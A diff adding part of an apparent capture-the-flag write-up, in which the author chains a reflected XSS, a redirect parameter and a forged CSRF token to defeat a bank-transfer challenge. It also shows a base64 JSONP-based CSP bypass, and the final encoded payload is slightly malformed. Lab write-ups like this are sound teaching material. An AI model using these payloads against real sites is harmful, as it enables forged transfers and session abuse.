@@ -87,3 +87,48 @@ The solution is to take advantage of the `jsonp` endpoint and the error page. if
 then base64 encode it and set it as the `menu` query param:
 
 `{{ url }}/?menu=PHNjcmlwdCBzcmM9Impzb25wP2NhbGxiYWNrPWFsZXJ0KCkiPjwvc2NyaXB0Pg==`
+
+### 8: CSRF bank transfer
+
+> This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.
+
+Poking around in this challenge reveals a couple of interesting flows:
+
+* the `amount` query param is XSS vulnerable with a simple `<script>alert()</script>` - though this is not enough for this challenge
+* the Set Username flow is interesting - the main challenge page `{{ url }}/index` and submitting a new username hits this endpoint: 
+```
+/set?name=name&value={{ submitted name }}&redirect=index
+```
+2 possible things here:  
+  * the `name` query param doesnt seem to be a vector for anything? its just there as a static param 
+  * we can probably use the `redirect` param to actually submit the xss payload to bypass the CSP policy
+
+Lets give this a shot. First lets see what the XSS payload would look like:
+```
+/transfer?name=bob&amount=<script>alert()<script>&csrf_token=RXA3MJYFAA
+```
+
+now lets combine the 2:
+```
+/set?name=name&value=the_hacker&redirect=transfer?name=bob&amount=<script>alert()<script>&csrf_token=RXA3MJYFAA
+```
+After URL encoding the `redirect` param:
+```
+/set?name=name&value=the_hacker&redirect=transfer%3Fname%3Dbob%26amount%3D%3Cscript%3Ealert()%3Cscript%3E%26csrf_token%3DRXA3MJYFAA
+```
+
+Bummer, we get an issue with the csrf token. Lets backtrack and see if there is a way to define the token ourselves.. The original `/set` endpoint takes a `name` param, lets see what happens if we try other form fields:  
+* `/set?name=amount&value=12345&redirect=index` doesnt seem to do anything 
+* `/set?name=csrf_token&value=12345&redirect=index` updates the value for the hidden form field! 
+
+Cool, lets try again:
+
+```
+/set?name=csrf_token&value=12345&redirect=transfer?name=bob&csrf_token=12345&amount=<script>alert()</script>
+```
+After URL encoding the `redirect` param:
+```
+/set?name=csrf_token&value=12345&redirect=transfer%3Fname%3Dbob%26amount%3D%3Cscript%3Ealert()%3C%2Fscript%3E%26csrf_token%12345
+```
+
+Success!
